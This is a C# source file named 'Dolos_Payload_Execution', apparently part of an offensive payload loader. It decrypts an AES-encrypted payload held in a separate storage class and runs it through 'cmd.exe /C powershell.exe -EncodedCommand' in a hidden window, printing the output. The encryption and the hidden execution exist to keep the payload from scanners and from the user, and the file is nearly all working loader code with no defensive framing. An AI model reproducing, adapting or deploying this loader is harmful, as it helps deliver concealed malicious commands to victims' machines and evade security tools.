using System;
using System.Diagnostics;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;
namespace Dolos_Payload_Execution
{
    class Program
    {
        public static String Payload = PayloadStringStorage.EncyptedPayload;
        public static String Salt = PayloadEncryptionKeyStorage.EncryptionKey;
        static void Main(string[] args)
        {
            Execute();
        }
        static String[] commands = new String[]{
            "cmd.exe",
            "/C powershell.exe -EncodedCommand "
            };
        public static void Execute()
        {
            System.Diagnostics.ProcessStartInfo psi = new System.Diagnostics.ProcessStartInfo();
            psi.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
            psi.FileName = commands[0];
            psi.Arguments = commands[1] + Crypto.Decrypt(Payload); 
            psi.RedirectStandardOutput = true;
            psi.UseShellExecute = false;
            System.Diagnostics.Process proc = System.Diagnostics.Process.Start(psi); ;
            System.IO.StreamReader myOutput = proc.StandardOutput;
            proc.WaitForExit(2000);
            if (proc.HasExited)
            {
                string output = myOutput.ReadToEnd();
                Console.WriteLine(output);
            }
            else
            {
                string output = myOutput.ReadToEnd();
                Console.WriteLine(output);
            }
            Console.ReadLine();
        }

        public class Crypto
        {
            private static String EncryptionKey = PayloadEncryptionKeyStorage.EncryptionKey;
            public static Random rand = new Random();
            public static string Encrypt(string clearText)
            {
                byte[] clearBytes = Encoding.Unicode.GetBytes(clearText);
                using (Aes encryptor = Aes.Create())
                {
                    byte[] IV = new byte[15];
                    rand.NextBytes(IV);
                    Rfc2898DeriveBytes pdb = new Rfc2898DeriveBytes(EncryptionKey, IV);
                    encryptor.Key = pdb.GetBytes(32);
                    encryptor.IV = pdb.GetBytes(16);
                    using (MemoryStream ms = new MemoryStream())
                    {
                        using (CryptoStream cs = new CryptoStream(ms, encryptor.CreateEncryptor(), CryptoStreamMode.Write))
                        {
                            cs.Write(clearBytes, 0, clearBytes.Length);
                            cs.Close();
                        }
                        clearText = Convert.ToBase64String(IV) + Convert.ToBase64String(ms.ToArray());
                    }
                }
                return clearText;
            }
            public static string Decrypt(string cipherText)
            {
                byte[] IV = Convert.FromBase64String(cipherText.Substring(0, 20));
                cipherText = cipherText.Substring(20).Replace(" ", "+");
                byte[] cipherBytes = Convert.FromBase64String(cipherText);
                using (Aes encryptor = Aes.Create())
                {
                    Rfc2898DeriveBytes pdb = new Rfc2898DeriveBytes(EncryptionKey, IV);
                    encryptor.Key = pdb.GetBytes(32);
                    encryptor.IV = pdb.GetBytes(16);
                    encryptor.Padding = PaddingMode.None;
                    using (MemoryStream ms = new MemoryStream())
                    {
                        using (CryptoStream cs = new CryptoStream(ms, encryptor.CreateDecryptor(), CryptoStreamMode.Write))
                        {
                            cs.Write(cipherBytes, 0, cipherBytes.Length);
                            cs.Close();
                        }
                        cipherText = Encoding.Unicode.GetString(ms.ToArray());
                    }
                }
                return cipherText;
            }
        }
    }
}
